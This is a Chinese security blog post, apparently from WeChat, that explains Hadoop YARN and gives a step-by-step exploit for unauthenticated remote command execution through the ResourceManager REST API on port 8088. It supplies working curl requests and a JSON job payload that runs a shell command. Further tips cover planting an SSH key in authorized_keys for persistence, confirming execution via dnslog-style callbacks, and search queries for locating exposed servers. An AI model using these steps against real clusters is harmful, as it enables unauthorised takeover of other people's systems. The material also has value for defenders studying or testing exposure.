\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/Em8ZmqHY7N8DNQ3uJl16ag)

**0X00    Hadoop 介绍和漏洞原理**

Hadoop 是一个由 Apache 的分布式系统基础架构，用户可开发分布式程序，充分利用集群的威力进行高速运算和存储，实现了一个分布式文件系统（Hadoop Distributed File System）。

其中 HDFS 组件有高容错性的特点，并且部署在低廉的（low-cost）硬件上即可提供高吞吐量（high throughput）来访问应用程序的数据。

![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvou89icXTVll91C6c4QibJbHcff1Naib56nHd7bK0jvgHLBQj4JfFm9kVdADKRQFSVP1rKPJeCBtKIHEJQ/640?wx_fmt=jpeg)

Apache Yarn（Yet Another Resource Negotiator 的缩写）是 hadoop 集群资源管理器系统，Yarn 从 hadoop 2 引入，最初是为了改善 MapReduce 的实现，但是它具有通用性，同样执行其他分布式计算模式。

ApplicationMaster 负责与 scheduler 协商合适的 container，跟踪应用程序的状态，以及监控它们的进度，ApplicationMaster 是协调集群中应用程序执行的进程。每个应用程序都有自己的 ApplicationMaster，负责与 ResourceManager 协商资源（container）和 NodeManager 协同工作来执行和监控任务 。

当一个 ApplicationMaster 启动后，会周期性的向 resourcemanager 发送心跳报告来确认其健康和所需的资源情况，在建好的需求模型中，ApplicationMaster 在发往 resourcemanager 中的心跳信息中封装偏好和限制，在随后的心跳中，ApplicationMaster 会对收到集群中特定节点上绑定了一定的资源的 container 的租约，根据 Resourcemanager 发来的 container，ApplicationMaster 可以更新它的执行计划以适应资源不足或者过剩，container 可以动态的分配和释放资源。

**与 job 相关的命令：**

```
1.查看 Job 信息：hadoop job -list
2.杀掉 Job：hadoop  job –kill  job\_id
3.更多细节：hadoop job -history all output-dir
4.杀死任务。被杀死的任务不会不利于失败尝试：hadoop jab -kill-task <task-id>
5.使任务失败。被失败的任务会对失败尝试不利：hadoop job  -fail-task <task-id>
```

**YARN 命令：**

YARN 命令是调用 bin/yarn 脚本文件，如果运行 yarn 脚本没有带任何参数，则会打印 yarn 所有命令的描述。

```
使用: yarn \[--config confdir\] COMMAND \[--loglevel loglevel\] \[GENERIC\_OPTIONS\] \[COMMAND\_OPTIONS\]
```

```
application使用: yarn application \[options\]
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou89icXTVll91C6c4QibJbHcff7xpY53ibraQYJDPJALz9hg0aawWToNne53AJ9KqaD1Wbic4geVAwIvZQ/640?wx_fmt=png)  

**运行 jar 文件**

用户可以将写好的 YARN 代码打包成 jar 文件，用这个命令去运行它：

```
yarn jar <jar> \[mainClass\] args...
```

**0X01    RCE 实现**

使用 ROOT 权限启动的 Hadoop 服务可根据在服务器 8088 端口接收用户提交的 POST 数据，根据其中参数执行相关 job，具体实现如下：

8088 端口的 Applications manager：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou89icXTVll91C6c4QibJbHcff8ZCKYDu1Pt68mAgILW0Rzia3UAE20Qqkd6rx7C8D6N6YSxC3zSZsX8Q/640?wx_fmt=png)

1\. 申请新的 application，直接通过 curl 进行 POST 请求：

```
curl -v -X POST 'http://ip:8088/ws/v1/cluster/apps/new-application'
```

返回内容类似于：

```
{"application-id":"application\_1527144634877\_20465","maximum-resource-capability":{"memory":16384,"vCores":8}}
```

2\. 构造并提交任务

构造 json 文件 1.json，内容如下，其中 application-id 对应上面得到的 id，命令内容为尝试在 / var/tmp 目录下创建 test\_1 文件，内容也为 111：

```
{
"am-container-spec":{
"commands":{
"command":"echo '111' >> /var/tmp/test\_1"
}
},
"application-id":"application\_1527144634877\_20465",
"application-name":"test",
"application-type":"YARN"
}
```

然后直接使用 curl 发送数据：

```
curl -s -i -X POST -H 'Accept: application/json' -H 'Content-Type: application/json' http://ip:8088/ws/v1/cluster/apps --data-binary @1.json
```

即可完成攻击，命令被执行，在相应目录下可以看到生成了对应文件，在 8088 端口 Web 界面可看到相关信息：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou89icXTVll91C6c4QibJbHcffXJEIBTpfTFgQQibq8nGZWVjv0Z151hgTM9zq0icJ0ibkTa8NRujArm99g/640?wx_fmt=png)

技巧：可配合 ceye、dnslog 测试命令执行结果。

**0X02    注意事项**  

**技巧：**

1\. 可配合 ceye 以及

dnslog 测试命令执行结果，或在 / home/user/.ssh/authorized\_keys 中写入公钥。

2\. 搜索开放服务：title="All Applications"

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou89icXTVll91C6c4QibJbHcffdV4F6AfSCGHlic8vQcFXfSgC2NgNBCPcbbUq1072aYCrwYLtRoK4ruA/640?wx_fmt=png)

或者 port=50070

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou89icXTVll91C6c4QibJbHcffajj3KZCPNtiaSgTfwIEzNMck2m4W6lTJ6HJaoicRAk1pkI1cugFAhRibA/640?wx_fmt=png)

**但此方式有三点限制：**

1\. 是服务需管理员权限启动，执行命令也是管理员权限执行，普通用户五相关命令权限只会有失败记录，命令最终执行失败，留下难以删除的攻击记录。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou89icXTVll91C6c4QibJbHcffyibXfOwcKQibqMZqUiab8fHvbdzwwiaMibU1VAJvaibVZYbkdJlAHQ6J1Y0Q/640?wx_fmt=png)

2\. 是 Hadoop 的 8088 管理端口若使用了权限认证，会提示

```
AuthorizationException："message":"Unable to obtain user name, user not authenticated
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou89icXTVll91C6c4QibJbHcffMkibEh16cXmzOwHgtPxSJu4tg3lTH7DlVkRBogNe8ozN9FAOD22gJeA/640?wx_fmt=png)  

3\. 是 master+slave 节点数大于等于 2，job 任务会根据 hadoop 分布式机制提交到任一台节点处理，目前笔者还未找到指定 namenode 的方法。

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)

[![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou80h6Jor7Py4sKIwfiaowozsMP0Yjn9RcoJAmPMKa5hQVczeXoDxIic2QaZYKKrLDlJFT5v6EpREmjg/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247492102&idx=1&sn=aa09a4f38ae21b73a1d3a938d97aae20&chksm=ec1cb739db6b3e2f7d7edc43d338e9f2dc4563edc768a34fb4214618f5107ecfc89f9d7b802c&scene=21#wechat_redirect)

**点赞 在看 转发**

原创投稿作者：伞

![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)